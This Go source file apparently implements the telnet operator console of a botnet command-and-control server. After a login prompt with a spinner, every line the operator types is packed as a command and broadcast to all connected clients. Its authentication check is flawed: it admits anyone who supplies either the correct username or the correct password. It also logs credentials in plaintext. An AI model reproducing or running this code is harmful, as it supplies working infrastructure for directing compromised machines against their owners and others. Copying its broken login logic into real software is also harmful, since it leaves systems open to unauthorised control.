package main

import (
	//"errors"
	"fmt"
	"net"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (admin *Admin) Handle() {

	defer func() {
		if err := recover(); err != nil {
			msg := fmt.Sprintf("%s", err)
			sp.logger.Error(msg)
		}
		admin.conn.Write([]byte("\033[?1049l"))
	}()

	admin.conn.Write([]byte("\033[?1049h"))
	admin.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	admin.conn.Write([]byte(strings.Replace(strings.Replace("spring\n", "\r\n", "\n", -1), "\n", "\r\n", -1)))

	admin.conn.SetDeadline(time.Now().Add(60 * time.Second))
	admin.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
	username, err := admin.ReadLine(false)
	if err != nil {
		sp.logger.Error("username: %s", err)
		return
	}

	admin.conn.SetDeadline(time.Now().Add(60 * time.Second))
	admin.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
	password, err := admin.ReadLine(true)
	if err != nil {
		sp.logger.Error("password: %s", err)
		return
	}

	admin.conn.SetDeadline(time.Now().Add(120 * time.Second))
	admin.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 5; i++ {
		admin.conn.Write(append([]byte("\r\033[37;1mLogin ing... \033[31m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(300) * time.Millisecond)
	}

	if username != sp.settings.AdminName && password != sp.settings.AdminPassword {
		admin.conn.Write([]byte("username or password error\r\n"))
		sp.logger.Debug("login faield: %s@%s", username, password)
		return
	}

	sp.logger.Debug("login success: %s@%s", username, password)

	//admin.conn.Write([]byte("\r\n\033[0m"))
	admin.conn.Write([]byte("[+] Succesfully connection\r\n"))
	admin.conn.Write([]byte("\033[0m# "))

	for {
		admin.conn.SetDeadline(time.Now().Add(120 * time.Second))
		line, err := admin.ReadLine(false)
		if err != nil {
			sp.logger.Error("read line: %s", err)
			return
		}

		if line == "exit" || line == "quit" {
			return
		}

		if line != "" {
			sp.logger.Debug("input line: %s", line)
			buf := Pack(COMMAND, line)
			clientList.AddCtrl(buf)
		}
		admin.conn.Write([]byte("\033[0m# "))
	}
}

func (admin *Admin) ReadLine(masked bool) (string, error) {

	buf := make([]byte, 2048)
	bufPos := 0

	for {
		n, err := admin.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := admin.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				admin.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			admin.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			admin.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				admin.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				admin.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				admin.conn.Write([]byte("*"))
			} else {
				admin.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
